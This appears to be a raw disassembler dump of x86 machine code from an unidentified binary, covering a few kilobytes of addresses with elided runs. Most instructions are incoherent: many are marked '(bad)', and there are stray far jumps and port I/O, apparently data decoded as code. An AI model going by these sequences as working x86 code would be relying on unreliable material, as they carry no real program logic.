  42385a:	dec    edx
  42385b:	out    dx,al
  42385c:	sub    eax,DWORD PTR [edi-0x66ac7806]
  423862:	dec    edx
  423863:	sub    ah,BYTE PTR [edi+0x7fa9e00a]
  423869:	repz and DWORD PTR [edx-0x17],0xffffff8a
  42386e:	jmp    0x93ff:0xa82d9645
  423875:	inc    esp
  423876:	(bad)  
  423877:	pop    eax
  423878:	das    
  423879:	aaa    
  42387a:	or     al,0x5e
  42387c:	in     al,0xee
  42387e:	popf   
  42387f:	dec    ecx
  423880:	pushf  
  423881:	imul   edx,DWORD PTR [ecx-0x36],0xe5c29e12
  423888:	or     al,0xbd
  42388a:	add    ch,bh
  42388c:	mov    ah,0x39
  42388e:	fist   DWORD PTR [bp+si]
  423891:	test   eax,0xd231c8ae
  423896:	jecxz  0x4238ab
  423898:	jg     0x4238ab
  42389a:	pop    ss
  42389b:	and    ebp,eax
  42389d:	jmp    0x423901
  42389f:	out    0x72,eax
  4238a1:	mov    ah,0xb
  4238a3:	data16 lods al,BYTE PTR ds:[esi]
  4238a5:	adc    esp,eax
  4238a7:	xor    al,0x3a
  4238a9:	loope  0x423906
  4238ab:	in     al,dx
  4238ac:	pop    ebx
  4238ad:	lea    esp,[edx+0xd953ea]
  4238b3:	or     eax,0xc67eec93
  4238b8:	(bad)  
  4238b9:	xlat   BYTE PTR ds:[ebx]
  4238ba:	icebp  
  4238bb:	popa   
  4238bc:	test   al,0x9a
  4238be:	out    dx,eax
  4238bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238c0:	and    BYTE PTR [edi-0x18],cl
  4238c3:	mov    WORD PTR [edi+0x21],gs
  4238c6:	cdq    
  4238c7:	or     edi,DWORD PTR [edi]
  4238c9:	ret    0xba57
  4238cc:	xor    eax,DWORD PTR [eax]
  4238ce:	pop    ds
  4238cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238d0:	ror    DWORD PTR [ecx-0x717bc3e0],cl
  4238d6:	mov    DWORD PTR [edi+0x53],ecx
  4238d9:	mov    ebx,0xed5258b8
  4238de:	or     al,0x76
  4238e0:	push   edi
  4238e1:	mov    esp,0xcfdf8fd8
  4238e6:	dec    DWORD PTR [eax]
  4238e8:	fisttp DWORD PTR [ecx-0x335a7c64]
  4238ee:	or     DWORD PTR [ebx+0x59a6b567],eax
  4238f4:	cli    
  4238f5:	lock sub DWORD PTR [eax+0x2f],eax
  4238f9:	push   ebx
  4238fa:	ds dec esi
  4238fc:	mov    bl,BYTE PTR [edx]
  4238fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238ff:	xor    DWORD PTR [esi],edi
  423901:	retf   
  423902:	jp     0x42392a
  423904:	adc    al,0x62
  423906:	gs dec edi
  423908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423909:	dec    eax
  42390a:	ins    DWORD PTR es:[edi],dx
  42390b:	add    BYTE PTR ds:0x522a5b,dh
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x44fc2bbd
  423982:	pop    eax
  423983:	mov    ds:0x17b78,eax
  423988:	add    al,0x1
  42398a:	add    BYTE PTR [eax],al
  42398c:	mov    ebx,0xad6dc0af
  423991:	inc    esi
  423992:	adc    ecx,DWORD PTR [ebx+0x5fb37bce]
  423998:	push   ebx
  423999:	mov    gs,WORD PTR [ebx-0x7651c43f]
  42399f:	mov    ebx,0x7d28d7d9
  4239a4:	or     DWORD PTR [ecx],0x61f7c084
  4239aa:	and    al,0x63
  4239ac:	pop    ss
  4239ad:	sbb    DWORD PTR [edx+0x2e],edx
  4239b0:	jp     0x42399a
  4239b2:	imul   edi,DWORD PTR [ebx],0x47
  4239b5:	ret    0xe180
  4239b8:	shr    DWORD PTR [ebx],0x67
  4239bb:	les    eax,FWORD PTR [ecx+0x1a]
  4239be:	jmp    0x423a1d
  4239c0:	pushf  
  4239c1:	jb     0x4239de
  4239c3:	lahf   
  4239c4:	push   ebx
  4239c5:	(bad)  
  4239c6:	loope  0x423a1f
  4239c8:	mov    ebx,0xb1810fbf
  4239cd:	scas   al,BYTE PTR es:[edi]
  4239ce:	ins    DWORD PTR es:[edi],dx
  4239cf:	das    
  4239d0:	dec    ebx
  4239d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239d2:	jbe    0x423a39
  4239d4:	das    
  4239d5:	lds    ebx,FWORD PTR [edx+0x270216e7]
  4239db:	mov    WORD PTR [ecx-0x28],gs
  4239de:	fs dec edx
  4239e0:	out    dx,al
  4239e1:	not    DWORD PTR [ebp-0x1]
  4239e4:	mov    ah,0xb6
  4239e6:	test   BYTE PTR [ecx+0x150c33d9],al
  4239ec:	adc    edx,DWORD PTR cs:[edi-0x6]
  4239f0:	add    DWORD PTR [esp+esi*8],edx
  4239f3:	sbb    BYTE PTR [ebx-0x69],dl
  4239f6:	lahf   
  4239f7:	push   0x2d8bc590
  4239fc:	inc    ebp
  4239fd:	sub    al,0x54
  4239ff:	xchg   esi,eax
  423a00:	pop    eax
  423a01:	adc    edi,DWORD PTR [ecx]
  423a03:	pusha  
  423a04:	dec    ebx
  423a05:	cmp    eax,0x1f630066
  423a0a:	mov    BYTE PTR [edx+0x9],bl
  423a0d:	cmc    
  423a0e:	fucom  st(6)
  423a10:	(bad)  
  423a12:	(bad)  
  423a13:	and    al,0xa6
  423a15:	scas   al,BYTE PTR es:[edi]
  423a16:	ins    BYTE PTR es:[edi],dx
  423a17:	dec    eax
  423a18:	pop    eax
  423a19:	xchg   ebp,eax
  423a1a:	ss jae 0x423a55
  423a1d:	or     DWORD PTR [esi-0xfd78e28],esp
  423a23:	inc    esi
  423a24:	jmp    0x423a86
  423a26:	mov    eax,ds:0x14f156e0
  423a2b:	sbb    eax,0x6873e162
  423a30:	test   al,0x81
  423a32:	mov    WORD PTR [ebx],fs
  423a34:	and    al,0x97
  423a36:	cmc    
  423a37:	sub    al,0x72
  423a39:	sub    al,0x8
  423a3b:	test   eax,0xd43aebfa
  423a40:	ret    0x14c
  423a43:	js     0x4239ca
  423a45:	xchg   BYTE PTR [ecx],dl
  423a47:	push   edi
  423a48:	cdq    
  423a49:	(bad)  
  423a4a:	cmp    eax,0x123df570
  423a4f:	retf   
  423a50:	fs mov eax,0x5eb9ac10
  423a56:	iret   
  423a57:	xchg   ecx,eax
  423a58:	jno    0x423aad
  423a5a:	es stos DWORD PTR es:[edi],eax
  423a5c:	inc    DWORD PTR [edi+edi*1-0x33035455]
  423a63:	inc    esp
  423a64:	iret   
  423a65:	loope  0x423ac6
  423a67:	mov    ah,bh
  423a69:	fnsave ds:0xd3ecacda
  423a6f:	sar    esi,cl
  423a71:	or     BYTE PTR [edx],ah
  423a73:	fcomp  DWORD PTR [esi+0x59a5785d]
  423a79:	adc    ebx,DWORD PTR [edx+0x2d74f877]
  423a7f:	or     esi,DWORD PTR [eax-0x444e4eee]
  423a85:	inc    edx
  423a86:	sbb    al,BYTE PTR [ecx+0x72]
  423a89:	mov    ch,0x65
  423a8b:	mov    ebp,esi
  423a8d:	pop    ebp
  423a8e:	push   ecx
  423a8f:	test   DWORD PTR [eax],0x0
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	sahf   
  423b01:	add    al,0xc5
  423b03:	mov    ch,0x7c
  423b05:	jl     0x423b08
  423b07:	add    BYTE PTR [ecx+eax*1],al
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	ror    BYTE PTR [esi-0x4c7f111a],1
  423b12:	adc    BYTE PTR [ebx+eax*2],0xc8
  423b16:	jnp    0x423b5b
  423b18:	xchg   eax,esp
  423b1a:	xor    edi,DWORD PTR [esi-0x5c41f041]
  423b20:	outs   dx,BYTE PTR es:[esi]
  423b22:	xchg   DWORD PTR [ebx+0x3d],ebp
  423b25:	inc    esi
  423b26:	adc    bh,BYTE PTR [ebx+0x45c11415]
  423b2c:	sub    BYTE PTR [eax+0x43538c2a],0x3a
  423b33:	ret    
  423b34:	adc    ebx,edx
  423b36:	std    
  423b37:	inc    ebx
  423b38:	call   DWORD PTR [ecx+ebx*4-0x36]
  423b3c:	call   0x80873871
  423b41:	iret   
  423b42:	dec    esi
  423b43:	repz pop ds
  423b45:	mov    eax,ds:0xf813c64d
  423b4a:	repnz dec eax
  423b4c:	cmp    al,0xa2
  423b4e:	push   0x3c
  423b50:	test   eax,0x1b4f84be
  423b55:	fnstsw WORD PTR [esi-0x4cb3cb18]
  423b5b:	sti    
  423b5c:	jmp    edx
  423b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b5f:	or     eax,0xd9c5b106
  423b64:	and    eax,0xbd138b28
  423b69:	sbb    al,0xbd
  423b6b:	xchg   edi,eax
  423b6c:	fcos   
  423b6e:	out    0xba,eax
  423b70:	push   edi
  423b71:	mov    ebp,0xbb739a35
  423b76:	repz in eax,dx
  423b78:	sbb    BYTE PTR [eax+eiz*8+0x3b212ec7],bl
  423b7f:	(bad)  
  423b80:	test   eax,0xaa6ea417
  423b85:	mov    ch,0x23
  423b87:	retf   0x92b3
  423b8a:	enter  0xd50a,0x65
  423b8e:	mov    DWORD PTR [ecx+0x388c5490],eax
  423b94:	cmc    
  423b95:	pop    esp
  423b96:	jge    0x423bb9
  423b98:	add    al,0x1f
  423b9a:	mov    esp,0x127bcc16
  423b9f:	shr    BYTE PTR [ebp+0x10],1
  423ba2:	dec    esp
  423ba3:	je     0x423b63
  423ba5:	jg     0x423c07
  423ba7:	arpl   ax,bp
  423ba9:	cs pop esp
  423bab:	data16 test ch,dl
  423bae:	cmp    eax,0x8270d459
  423bb3:	mov    dl,BYTE PTR [esi-0x5757190c]
  423bb9:	adc    bh,BYTE PTR [esi+edi*2]
  423bbc:	out    0xfc,al
  423bbe:	aas    
  423bbf:	call   0x27ed:0xd7af57a9
  423bc6:	jge    0x423b5b
  423bc8:	sti    
  423bc9:	mov    cl,0x42
  423bcb:	call   0x67e1be6f
  423bd0:	sub    ch,dl
  423bd2:	pop    ebx
  423bd3:	je     0x423bc8
  423bd5:	es sub ebx,ebp
  423bd8:	mov    eax,0xe6b86d2c
  423bdd:	sbb    al,0xe3
  423bdf:	scas   al,BYTE PTR es:[edi]
  423be0:	std    
  423be1:	xchg   ecx,eax
  423be2:	test   BYTE PTR [edi-0x3d],al
  423be5:	mov    bh,0x9b
  423be7:	sub    esi,esp
  423be9:	std    
  423bea:	dec    eax
  423beb:	mov    esp,0x248303de
  423bf0:	pop    ss
  423bf1:	fcomp  QWORD PTR [ebp+0x4f48d8f6]
  423bf7:	sub    al,0x70
  423bf9:	jg     0x423c52
  423bfb:	dec    edx
  423bfc:	popf   
  423bfd:	xchg   esp,eax
  423bfe:	repz aas 
  423c00:	call   0x35eb:0x85792515
  423c07:	xor    al,0xbc
  423c09:	and    bl,dl
  423c0b:	in     al,0x31
  423c0d:	aaa    
  423c0e:	sbb    bh,bl
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x38bb99e9]
  423c81:	or     DWORD PTR [eax-0x57],0xffffff80
  423c85:	jge    0x423c88
  423c87:	add    BYTE PTR [ecx+eax*1],al
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	and    dl,dh
  423c8e:	scas   al,BYTE PTR es:[edi]
  423c8f:	call   0x244dd443
  423c94:	outs   dx,DWORD PTR ds:[esi]
  423c95:	imul   edi,ebx,0xffffffe9
  423c98:	pop    ebp
  423c99:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  423c9b:	dec    esp
  423c9c:	clc    
  423c9d:	retf   0xe0f5
  423ca0:	push   ecx
  423ca1:	mov    al,0xd7
  423ca3:	in     al,0x38
  423ca5:	push   es
  423ca6:	stc    
  423ca7:	xchg   ebx,eax
  423ca9:	leave  
  423caa:	xor    ebp,esi
  423cac:	test   BYTE PTR [ecx-0x6ae570f3],ch
  423cb2:	out    dx,al
  423cb3:	push   0x1b
  423cb5:	pop    ds
  423cb6:	fstp   st(3)
  423cb8:	or     eax,0x292811f3
  423cbd:	xor    eax,0x25460915
  423cc2:	ret    0xb577
  423cc5:	iret   
  423cc6:	jl     0x423cf1
  423cc8:	out    0x12,eax
  423cca:	lahf   
  423ccb:	shl    BYTE PTR [edx],1
  423ccd:	or     al,0xb8
  423ccf:	je     0x423d27
  423cd1:	jp     0x423d09
  423cd3:	inc    ebx
  423cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cd5:	pop    es
  423cd6:	loope  0x423ca2
  423cd8:	inc    esp
  423cd9:	sahf   
  423cda:	test   BYTE PTR ds:0xd887318d,dl
  423ce0:	jg     0x423d2c
  423ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ce3:	mov    al,0x1f
  423ce5:	stc    
  423ce6:	lods   al,BYTE PTR ds:[esi]
  423ce7:	mov    ds:0xaa92745d,eax
  423cec:	nop
  423ced:	fadd   QWORD PTR [edx]
  423cef:	lods   eax,DWORD PTR ds:[esi]
  423cf0:	js     0x423cb5
  423cf2:	mov    ebp,0x67862073
  423cf7:	cld    
  423cf8:	scas   al,BYTE PTR es:[edi]
  423cf9:	pop    ecx
  423cfa:	sbb    esp,edi
  423cfc:	pop    edi
  423cfd:	push   eax
  423cfe:	or     DWORD PTR [edx+0x50],edx
  423d01:	jne    0x423c9d
  423d03:	ret    
  423d04:	cmc    
  423d05:	adc    eax,0xd333ff80
  423d0a:	nop
  423d0b:	aad    0x20
  423d0d:	or     BYTE PTR [ebp+0x6c],0x13
  423d11:	or     esi,DWORD PTR [edx-0x4a]
  423d14:	out    dx,al
  423d15:	in     eax,0xd9
  423d17:	or     cl,BYTE PTR [edi]
  423d19:	shr    DWORD PTR [ebx+0x77],0x39
  423d1d:	pop    ebx
  423d1e:	push   esi
  423d1f:	xor    eax,0xcdb86303
  423d24:	xchg   DWORD PTR [edx+esi*8],eax
  423d27:	or     edi,ecx
  423d29:	pop    es
  423d2a:	mov    ?,WORD PTR [ebx-0x3c8db855]
  423d30:	add    al,dh
  423d32:	in     eax,dx
  423d33:	xchg   ecx,eax
  423d34:	inc    esi
  423d35:	cmp    al,0xbd
  423d37:	stc    
  423d38:	stos   DWORD PTR es:[edi],eax
  423d39:	and    edx,DWORD PTR [ebx+0x71]
  423d3c:	xchg   BYTE PTR [esi+esi*8+0x1ce26677],ch
  423d43:	lahf   
  423d44:	stc    
  423d45:	xchg   esp,eax
  423d46:	push   ecx
  423d47:	mov    WORD PTR ss:[ecx-0x51c568ea],gs
  423d4e:	ins    DWORD PTR es:[edi],dx
  423d4f:	ss push ebp
  423d51:	shl    DWORD PTR es:[edi-0x31],cl
  423d55:	add    al,ah
  423d57:	sar    BYTE PTR [ecx+0x9],0xb2
  423d5b:	lds    ebx,FWORD PTR [ebp+0x6f]
  423d5e:	out    dx,al
  423d5f:	(bad)  
  423d60:	jbe    0x423cf1
  423d62:	push   0x6b
  423d64:	sub    dh,BYTE PTR [ebp-0x52]
  423d67:	fsubr  QWORD PTR [edi]
  423d69:	xchg   bx,ax
  423d6b:	jmp    0x6b84:0x128a45a5
  423d72:	push   eax
  423d73:	ja     0x423de9
  423d75:	pop    edi
  423d76:	xchg   ebx,eax
  423d77:	mov    ah,BYTE PTR [ebp-0x3ac3dd73]
  423d7d:	test   esi,0x85b57121
  423d83:	fsubr  QWORD PTR [ebp-0x11]
  423d86:	js     0x423d2d
  423d88:	xor    BYTE PTR [ebp+0x62e09df1],ah
  423d8e:	push   ecx
  423d8f:	mov    ah,0x0
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x4f5a022e],esp
  423e03:	outs   dx,BYTE PTR ds:[esi]
  423e04:	test   BYTE PTR [esi+0x1],bh
  423e07:	add    BYTE PTR [ecx+eax*1],al
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	ins    BYTE PTR es:[edi],dx
  423e0d:	mov    al,0x6d
  423e0f:	std    
  423e10:	in     eax,dx
  423e11:	je     0x423e59
  423e13:	jg     0x423e03
  423e15:	mov    WORD PTR [ebx],es
  423e17:	(bad)  
  423e18:	je     0x423e54
  423e1a:	mov    ?,WORD PTR [ebx+0x2e]
  423e1d:	stc    
  423e1e:	mov    ch,0x4
  423e20:	xor    al,0x58
  423e22:	push   edx
  423e23:	int    0xe6
  423e25:	lods   eax,DWORD PTR ds:[esi]
  423e26:	jbe    0x423db6
  423e28:	xchg   ebx,eax
  423e29:	mov    ah,0x4f
  423e2b:	out    0x34,al
  423e2d:	cmc    
  423e2e:	popa   
  423e2f:	adc    al,0xff
  423e31:	out    dx,al
  423e32:	out    0xd7,al
  423e34:	and    eax,0xc5b537ef
  423e39:	cmove  esp,DWORD PTR ds:0x12b2d063
  423e40:	iret   
  423e41:	and    BYTE PTR [ebx+ecx*8-0x33],ch
  423e45:	add    al,0x60
  423e47:	cmp    DWORD PTR [ebx+0x16],ebp
  423e4a:	into   
  423e4b:	arpl   WORD PTR [ecx+0x256c6e44],cx
  423e51:	dec    edx
  423e52:	cs xchg sp,ax
  423e55:	in     al,0xe5
  423e57:	xor    dl,BYTE PTR [edi]
  423e59:	cmp    DWORD PTR [esi+eiz*8],0x78cc25b3
  423e60:	adc    esi,DWORD PTR [edi+edi*2+0x622efc53]
  423e67:	jle    0x423e3e
  423e69:	icebp  
  423e6a:	imul   edx,DWORD PTR [edx-0x5d],0x4d3e1391
  423e71:	mov    bl,0xf7
  423e73:	jp     0x423eac
  423e75:	pop    esp
  423e76:	out    0xed,eax
  423e78:	mov    eax,ds:0xf33a8bf3
  423e7d:	call   FWORD PTR [eax]
  423e7f:	mov    edx,0xbfffc25e
  423e84:	push   ds
  423e85:	fimul  WORD PTR [ecx+ebx*1-0x68]
  423e89:	out    dx,al
  423e8a:	xchg   edx,eax
  423e8b:	xchg   DWORD PTR [eax],esp
  423e8d:	sbb    ebx,ecx
  423e8f:	push   ds
  423e90:	sti    
  423e91:	out    0x92,al
  423e93:	pop    eax
  423e94:	enter  0x9a2b,0x2f
  423e98:	push   edx
  423e99:	(bad)  
  423e9a:	ds inc ebx
  423e9c:	push   ebp
  423e9d:	inc    esp
  423e9e:	(bad)  
  423e9f:	es push esi
  423ea1:	sbb    eax,0xa9f490cd
  423ea6:	xchg   BYTE PTR [edi+esi*4+0x70],ch
  423eaa:	dec    eax
  423eab:	xor    BYTE PTR [edi+eax*8+0x40],ch
  423eaf:	test   eax,0x4e10d4d5
  423eb4:	scas   al,BYTE PTR es:[edi]
  423eb5:	out    0x93,eax
  423eb7:	inc    edi
  423eb8:	popa   
  423eb9:	cmc    
  423eba:	int    0x5
  423ebc:	push   0x48
  423ebe:	inc    edi
  423ebf:	and    ebp,DWORD PTR [edi+0x59]
  423ec2:	add    edi,ecx
  423ec4:	bnd ret 0xa598
  423ec8:	std    
  423ec9:	hlt    
  423eca:	or     al,0x8a
  423ecc:	daa    
  423ecd:	sub    BYTE PTR [ebx+0x4a7d343f],0x97
  423ed4:	ret    
  423ed5:	es scas eax,DWORD PTR es:[edi]
  423ed7:	stc    
  423ed8:	xor    al,0xb4
  423eda:	sar    DWORD PTR [esi-0x2292e3da],1
  423ee0:	mov    ?,WORD PTR [ecx]
  423ee2:	sub    ch,ah
  423ee4:	xchg   edi,eax
  423ee5:	sub    al,0x48
  423ee7:	ret    0x91b
  423eea:	fidiv  DWORD PTR [ebp-0x628c29b7]
  423ef0:	les    eax,FWORD PTR [ebp-0x34b426fa]
  423ef6:	fimul  DWORD PTR [ebx]
  423ef8:	repnz test eax,0x86675a4d
  423efe:	xchg   ebp,eax
  423eff:	lds    edi,FWORD PTR ds:[ebx-0x7e]
  423f03:	leave  
  423f04:	adc    edi,DWORD PTR [ebp-0x1b]
  423f07:	jmp    0x7009:0xe719e3ee
  423f0e:	inc    esi
  423f0f:	sbb    al,0x0
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	lock stc 
  423f82:	push   ebp
  423f83:	mov    ebp,0x17f88
  423f88:	add    al,0x1
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	jb     0x423f27
  423f8e:	fistp  DWORD PTR [ebx-0x19231711]
  423f94:	int3   
  423f95:	mov    ?,WORD PTR [edx+ecx*8]
  423f98:	cmp    al,0x5b
  423f9a:	xor    al,0x12
  423f9c:	and    al,0xb8
  423f9e:	outs   dx,BYTE PTR ds:[esi]
  423f9f:	in     al,0x7f
  423fa1:	js     0x42401e
  423fa3:	dec    ebp
  423fa4:	adc    BYTE PTR [edi],ah
  423fa6:	mov    cs,WORD PTR [ebx+0x3a]
  423fa9:	ja     0x423fc7
  423fab:	ds leave 
  423fad:	iret   
  423fae:	adc    ebx,ebp
  423fb0:	xor    eax,0x8ffb738d
  423fb5:	xchg   ebx,eax
  423fb6:	enter  0x1ce8,0xcb
  423fba:	cmp    DWORD PTR [ebx-0x58449556],edx
  423fc0:	enter  0x472e,0xf1
  423fc4:	in     eax,0x4f
  423fc6:	push   0x3319b2
  423fcb:	cmp    dh,ah
  423fcd:	mov    ebp,0xe3ca61e9
  423fd2:	mov    ds:0xc39bbe66,eax
  423fd7:	xchg   esi,eax
  423fd8:	cmp    ah,bl
  423fda:	test   ecx,eax
  423fdc:	sub    BYTE PTR [ecx-0x927b5c5],dh
  423fe2:	lds    edi,FWORD PTR [ecx-0x331207f9]
  423fe8:	mov    ds:0xab4205b8,al
  423fed:	jae    0x423f78
  423fef:	xor    edx,eax
  423ff1:	dec    eax
  423ff2:	push   ebp
  423ff3:	out    0x18,eax
  423ff5:	scas   al,BYTE PTR es:[edi]
  423ff6:	push   0x5b0a8904
  423ffb:	std    
  423ffc:	jbe    0x423f96
  423ffe:	jnp    0x423fb1
  424000:	cdq    
  424001:	scas   al,BYTE PTR es:[edi]
  424002:	cld    
  424003:	jmp    0x7507:0xd470d590
  42400a:	call   0x65e5:0xc5c62dd4
  424011:	sar    al,cl
  424013:	mov    ecx,0x6df45adf
  424018:	mov    DWORD PTR [ebx-0x36784d90],esp
  42401e:	icebp  
  42401f:	fidiv  DWORD PTR [esi+0x33d40d31]
  424025:	sahf   
  424026:	push   ecx
  424027:	and    DWORD PTR [ebx+0x3e5f99e1],esi
  42402d:	neg    BYTE PTR [edi+edx*2+0x5ea18475]
  424034:	hlt    
  424035:	mov    eax,0xca6720d7
  42403a:	inc    ebx
  42403b:	mov    ebx,0x96a752f8
  424040:	mov    eax,0x78168371
  424045:	and    DWORD PTR [ebp+0x2e],eax
  424048:	sbb    eax,0xcd7b84af
  42404d:	jb     0x423ff3
  42404f:	sub    al,0x2c
  424051:	xor    eax,ecx
  424053:	std    
  424054:	mov    ecx,0x6f27b259
  424059:	fidiv  WORD PTR ds:0xd9ca8b96
  42405f:	dec    edx
  424061:	js     0x424005
  424063:	mov    eax,0xeb2cdfb8
  424068:	nop
  424069:	sets   BYTE PTR [ebx+0x7d]
  42406d:	leave  
  42406e:	lock inc ebp
  424070:	call   0x51260916
  424075:	jmp    0x424060
  424077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424078:	xor    bl,BYTE PTR [edi+0x262dd69f]
  42407e:	and    DWORD PTR [eax+ebp*1],ebx
  424081:	push   edx
  424082:	jecxz  0x4240ba
  424084:	adc    al,0x4e
  424086:	or     DWORD PTR [edx],esp
  424088:	dec    ecx
  424089:	stc    
  42408a:	out    dx,eax
  42408b:	fisubr WORD PTR [edx]
  42408d:	aad    0xb2
  42408f:	lock add BYTE PTR [eax],al
	...
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	pop    edx
  424101:	rcl    BYTE PTR [ecx+edi*4],0x8c
  424105:	add    BYTE PTR [ecx],0x0
  424108:	add    al,0x1
  42410a:	add    BYTE PTR [eax],al
  42410c:	cmc    
  42410d:	cmp    eax,0xaeeed113
  424112:	fld    QWORD PTR [eax+0x6f]
  424115:	ss ins BYTE PTR es:[edi],dx
  424117:	xchg   edi,eax
  424118:	mov    ch,0x2c
  42411a:	jne    0x42418a
  42411c:	cs daa 
  42411e:	pop    esp
  42411f:	jbe    0x424189
  424121:	and    al,0x82
  424123:	in     al,dx
  424124:	jle    0x4240d8
  424126:	lods   eax,DWORD PTR ds:[esi]
  424127:	pop    es
  424128:	inc    ecx
  424129:	sub    BYTE PTR [ebx+0x24],ch
  42412c:	imul   edx,edx,0x1c
  42412f:	dec    ebp
  424130:	xor    BYTE PTR [esi],bh
  424132:	mov    dl,0xd1
  424134:	test   BYTE PTR [edx+0x2671dd6e],dh
  42413a:	sbb    BYTE PTR [edx],ch
  42413c:	cli    
  42413d:	mov    bh,BYTE PTR [ebx+0x5e]
  424140:	dec    esp
  424141:	mov    dl,0xd4
  424143:	loope  0x4241ac
  424145:	mov    ds:0x4cb74fe4,eax
  42414a:	pop    edx
  42414b:	iret   
  42414c:	int3   
  42414d:	aaa    
  42414e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42414f:	xor    cl,dh
  424151:	pop    esp
  424152:	popf   
  424153:	sub    BYTE PTR [esi+0x62],bl
  424156:	lock inc ecx
  424158:	std    
  424159:	rcr    DWORD PTR [ebx+0x70],cl
  42415c:	mov    ch,0x81
  42415e:	cld    
  42415f:	and    DWORD PTR [eax-0x7a],ecx
  424162:	xor    BYTE PTR [eax+0x6999a96a],cl
  424168:	push   ebp
  424169:	inc    ebx
  42416a:	xchg   edx,eax
  42416b:	adc    eax,0x68a7305d
  424170:	inc    edx
  424171:	mov    ebp,0xf6b649c7
  424176:	jmp    0xa83358a
  42417b:	adc    dh,bl
  42417d:	push   edx
  42417e:	mov    bl,0x85
  424180:	loope  0x4241d1
  424182:	(bad)  
  424183:	mov    dh,0x20
  424185:	sbb    al,0x13
  424187:	call   0xb5781add
  42418c:	xor    bl,ah
  42418e:	mov    dl,0x41
  424190:	xor    edx,ebx
  424192:	dec    ecx
  424193:	mov    ecx,0xee745535
  424198:	fld    QWORD PTR [eax]
  42419a:	out    0x36,eax
  42419c:	jo     0x42418c
  42419e:	push   eax
  42419f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241a0:	push   ebx
  4241a1:	adc    esp,DWORD PTR [esi]
  4241a3:	iret   
  4241a4:	les    ecx,FWORD PTR [esi+0x48]
  4241a7:	data16 or BYTE PTR [eax+0x57],0xda
  4241ac:	loop   0x424149
  4241ae:	mov    edi,0xa267f3c3
  4241b3:	out    dx,al
  4241b4:	xor    dh,ch
  4241b6:	rol    BYTE PTR [eax-0x5247c78],cl
  4241bc:	dec    edx
  4241bd:	jge    0x424229
  4241bf:	adc    ecx,DWORD PTR [edx+0x67f45045]
  4241c5:	inc    ebp
  4241c6:	jo     0x4241d2
  4241c8:	cmp    BYTE PTR [edi+0x75b308f2],0xae
  4241cf:	cli    
  4241d0:	stc    
  4241d1:	pop    eax
  4241d2:	ficomp WORD PTR [ebp-0x7]
  4241d5:	push   edx
  4241d6:	push   ds
  4241d7:	jmp    FWORD PTR [eax]
  4241d9:	mov    eax,ds:0x90d94b6
  4241de:	mov    bl,0x72
  4241e0:	pop    edi
  4241e1:	in     al,dx
  4241e2:	outs   dx,BYTE PTR ds:[esi]
  4241e3:	fiadd  DWORD PTR [edi]
  4241e5:	sub    al,BYTE PTR [edi]
  4241e7:	push   0xbe2aa69d
  4241ec:	push   cs
  4241ed:	enter  0x4e40,0x3b
  4241f1:	xchg   esi,eax
  4241f2:	jmp    0x738bc2a6
  4241f7:	lods   eax,DWORD PTR ds:[esi]
  4241f8:	(bad)  
  4241f9:	mov    dl,0x34
  4241fb:	(bad)  
  4241fd:	pop    ds
  4241fe:	adc    bl,BYTE PTR [ebx]
  424200:	inc    ebp
  424201:	push   cs
  424202:	inc    esi
  424203:	out    dx,al
  424204:	jo     0x424249
  424206:	std    
  424207:	loop   0x424236
  424209:	and    al,BYTE PTR [eax-0x35abaebe]
  42420f:	push   ebp
	...
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	out    0x9b,al
  424282:	test   DWORD PTR [ebp-0x70],ebp
  424285:	add    DWORD PTR [ecx],0x10400
  42428b:	add    BYTE PTR [ecx],dh
  42428d:	retf   0xff26
  424290:	inc    ecx
  424291:	cmp    al,bl
  424293:	ret    0x3487
  424296:	push   eax
  424297:	call   FWORD PTR [edi+0x3c]
  42429a:	jmp    0x424279
  42429c:	sbb    bh,dl
  42429e:	ds (bad) 
  4242a0:	scas   eax,DWORD PTR es:[edi]
  4242a1:	xor    ecx,DWORD PTR [ecx-0x52b8de68]
  4242a7:	loop   0x42431f
  4242a9:	xchg   edx,eax
  4242aa:	pop    ds
  4242ab:	das    
  4242ac:	inc    bx
  4242ae:	lock jne 0x42432e
  4242b1:	test   al,0x10
  4242b3:	sub    al,0xc5
  4242b5:	dec    esp
